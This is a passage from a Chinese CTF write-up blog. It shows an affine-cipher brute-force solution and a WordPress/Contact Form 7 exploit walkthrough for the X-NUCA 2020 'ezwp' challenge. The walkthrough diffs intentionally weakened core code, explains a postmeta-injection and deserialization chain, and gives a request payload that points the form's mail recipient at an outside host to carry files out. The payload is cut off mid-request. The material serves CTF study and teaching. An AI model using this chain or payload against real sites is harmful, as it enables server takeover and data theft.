class="string">&#x27;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#x27;</span></span><br><span class="line">MOD = <span class="built_in">len</span>(TABLE)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> flag:</span><br><span class="line">    i = TABLE.find(b)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        cipher += b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ii = (A*i + B) % MOD</span><br><span class="line">        cipher += TABLE[ii]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"><span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们观察可以发现这其实是个单表替换加密</p>
<p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p>
<p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p>
<p>于是有</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TABLE = <span class="string">&#x27;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#x27;</span></span><br><span class="line">MOD = <span class="built_in">len</span>(TABLE)</span><br><span class="line">cipher=<span class="string">&quot;A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> A <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,MOD):</span><br><span class="line">    <span class="keyword">for</span> B <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,MOD):</span><br><span class="line">        result=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            <span class="comment">#生成加密表</span></span><br><span class="line">            TABLE2=&#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> TABLE:</span><br><span class="line">                i=TABLE.find(b)</span><br><span class="line">                TABLE2[TABLE[(A*i + B) % MOD]]=b</span><br><span class="line">            <span class="comment">#解密</span></span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> cipher:</span><br><span class="line">                ii=TABLE.find(b)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> ii==-<span class="number">1</span>:</span><br><span class="line">                    result+=b</span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    result+=TABLE2[b]</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020hgame/" data-id="cku8j3ffu000adan72g172ope" data-title="2020hgame" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p>
<p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p>
<p>漏洞分析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/774/">https://paper.seebug.org/774/</a></p>
<p>对wp和插件对比以下官方下载的，存在以下差异</p>
<h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p>
<hr>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) &amp;&amp; isset( $_POST[&#x27;post_ID&#x27;] ) &amp;&amp; (int) $_GET[&#x27;post&#x27;] !== (int) $_POST[&#x27;post_ID&#x27;] ) &#123;</span><br><span class="line">						wp_die( __( &#x27;A post ID mismatch has been detected.&#x27; ), __( &#x27;Sorry, you are not allowed to edit this item.&#x27; ), 400 );</span><br><span class="line">					&#125; elseif ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">					&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						$post_id = 0;</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">					&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						$post_id = 0;</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( (stristr(file_get_contents($file[&#x27;tmp_name&#x27;]), &quot;php&quot;) !== FALSE) ) &#123;</span><br><span class="line">        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#x27;Sorry, this file content is not permitted for security reasons.&#x27; ) ) );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>/wp-admin/includes/post.php 221</p>
<p>array_diff_key 参数少了’file’</p>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return array_diff_key( $post_data, array_flip( array( &#x27;meta_input&#x27;, &#x27;file&#x27;, &#x27;guid&#x27; ) ) );</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return array_diff_key( $post_data, array_flip( array( &#x27;meta_input&#x27;, &#x27;guid&#x27; ) ) );</span><br></pre></td></tr></table></figure>

<hr>
<p>wp-admin/post.php 19行，少了很多条件</p>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) &amp;&amp; isset( $_POST[&#x27;post_ID&#x27;] ) &amp;&amp; (int) $_GET[&#x27;post&#x27;] !== (int) $_POST[&#x27;post_ID&#x27;] ) &#123;</span><br><span class="line">	wp_die( __( &#x27;A post ID mismatch has been detected.&#x27; ), __( &#x27;Sorry, you are not allowed to edit this item.&#x27; ), 400 );</span><br><span class="line">&#125; elseif ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$post_id = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$post_id = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function unserialize( $serialized ) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * @inheritdoc</span><br><span class="line">	 */</span><br><span class="line">	public function __unserialize( $serialized ) &#123; // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function __wakeup() &#123; // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound</span><br><span class="line">		unset( $this-&gt;callback );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    return wp_mail( $recipient, $subject, $body, $headers, $attachments );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function send_mail($to, $subject, $message, $headers = &#x27;&#x27;, $attachments = array()) &#123;</span><br><span class="line">	    try &#123;</span><br><span class="line">            $host = explode(&quot;@&quot;, $to)[1];</span><br><span class="line">            $url = &quot;http://$host&quot;;</span><br><span class="line">            $post_data = array(</span><br><span class="line">                &quot;subject&quot; =&gt; $subject,</span><br><span class="line">                &quot;message&quot; =&gt; $message,</span><br><span class="line">                &quot;headers&quot; =&gt; $headers</span><br><span class="line">            );</span><br><span class="line">            if ($attachments !== array()) &#123;</span><br><span class="line">                if (!empty($attachments[0])) &#123;</span><br><span class="line">                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch , CURLOPT_URL , $url);</span><br><span class="line">            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">            curl_setopt($ch , CURLOPT_POST, 1);</span><br><span class="line">			curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">			$data = curl_exec($ch);</span><br><span class="line">			curl_close($ch);</span><br><span class="line">			if ($data) &#123;</span><br><span class="line">				file_put_contents(&quot;/tmp/1.log&quot;, $data);</span><br><span class="line">			&#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (Exception $e) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p>
<h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p>
<p>/wp-admin/includes/post.php 221：</p>
<p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) ); </code></p>
<p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p>
<p>/wp-admin/includes/post.php 872：</p>
<p><code>add_meta( $post_ID );</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_meta</span>(<span class="params"> <span class="variable">$post_ID</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$post_ID</span> = (<span class="keyword">int</span>) <span class="variable">$post_ID</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$metakeyselect</span> = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyselect&#x27;</span>] ) ? wp_unslash( trim( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyselect&#x27;</span>] ) ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$metakeyinput</span>  = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyinput&#x27;</span>] ) ? wp_unslash( trim( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyinput&#x27;</span>] ) ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$metavalue</span>     = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metavalue&#x27;</span>] ) ? <span class="variable">$_POST</span>[<span class="string">&#x27;metavalue&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> ( is_string( <span class="variable">$metavalue</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$metavalue</span> = trim( <span class="variable">$metavalue</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ( ( <span class="string">&#x27;#NONE#&#x27;</span> !== <span class="variable">$metakeyselect</span> ) &amp;&amp; ! <span class="keyword">empty</span>( <span class="variable">$metakeyselect</span> ) ) || ! <span class="keyword">empty</span>( <span class="variable">$metakeyinput</span> ) ) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We have a key/value pair. If both the select and the input</span></span><br><span class="line"><span class="comment">		 * for the key have data, the input takes precedence.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="string">&#x27;#NONE#&#x27;</span> !== <span class="variable">$metakeyselect</span> ) &#123;</span><br><span class="line">			<span class="variable">$metakey</span> = <span class="variable">$metakeyselect</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$metakeyinput</span> ) &#123;</span><br><span class="line">			<span class="variable">$metakey</span> = <span class="variable">$metakeyinput</span>; <span class="comment">// Default.</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( is_protected_meta( <span class="variable">$metakey</span>, <span class="string">&#x27;post&#x27;</span> ) || ! current_user_can( <span class="string">&#x27;add_post_meta&#x27;</span>, <span class="variable">$post_ID</span>, <span class="variable">$metakey</span> ) ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$metakey</span> = wp_slash( <span class="variable">$metakey</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> add_post_meta( <span class="variable">$post_ID</span>, <span class="variable">$metakey</span>, <span class="variable">$metavalue</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p>
<p>但是我们跟踪以下插件渲染表单的代码发现</p>
<p>contact-form.php:129</p>
<p>class WPCF7_ContactForm</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$post</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">		<span class="variable">$post</span> = get_post( <span class="variable">$post</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$post</span> &amp;&amp; <span class="built_in">self</span>::post_type == get_post_type( <span class="variable">$post</span> ) ) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;id = <span class="variable">$post</span>-&gt;ID;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = <span class="variable">$post</span>-&gt;post_name;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;title = <span class="variable">$post</span>-&gt;post_title;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;locale = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_locale&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">			<span class="variable">$properties</span> = <span class="keyword">$this</span>-&gt;get_properties();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">foreach</span> ( <span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line">				<span class="keyword">if</span> ( metadata_exists( <span class="string">&#x27;post&#x27;</span>, <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_&#x27;</span> . <span class="variable">$key</span> ) ) &#123;</span><br><span class="line">					<span class="variable">$properties</span>[<span class="variable">$key</span>] = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_&#x27;</span> . <span class="variable">$key</span>, <span class="literal">true</span> );</span><br><span class="line">				&#125; <span class="keyword">elseif</span> ( metadata_exists( <span class="string">&#x27;post&#x27;</span>, <span class="variable">$post</span>-&gt;ID, <span class="variable">$key</span> ) ) &#123;</span><br><span class="line">					<span class="variable">$properties</span>[<span class="variable">$key</span>] = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="variable">$key</span>, <span class="literal">true</span> );</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&gt;properties = <span class="variable">$properties</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;upgrade();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		do_action( <span class="string">&#x27;wpcf7_contact_form&#x27;</span>, <span class="keyword">$this</span> );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p>
<p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p>
<p>于是构造</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;async&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;crossDomain&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: <span class="built_in">document</span>.getElementById(<span class="string">&quot;_wpnonce&quot;</span>).value,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;%2Fwp-admin%2Fpost-new.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_ID&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="string">&quot;originalaction&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_author&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>: <span class="string">&quot;wpcf7_contact_form&quot;</span>,</span><br><span class="line">        <span class="string">&quot;original_post_status&quot;</span>: <span class="string">&quot;auto-draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;auto_draft&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_title&quot;</span>: <span class="string">&quot;readflagtotmp2log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wp-preview&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mm&quot;</span>: <span class="string">&quot;12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jj&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_thumbnail_id&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;advanced_view&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;comment_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ping_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metakeyinput&quot;</span>:<span class="string">&quot;mail&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[subject]&quot;</span>: <span class="string">&quot;test \&quot;[your-subject]\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[sender]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[recipient]&quot;</span>: <span class="string">&quot;ccreater@172.16.8.6:60000&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[body]&quot;</span>: <span class="string">&quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[additional_headers]&quot;</span>: <span 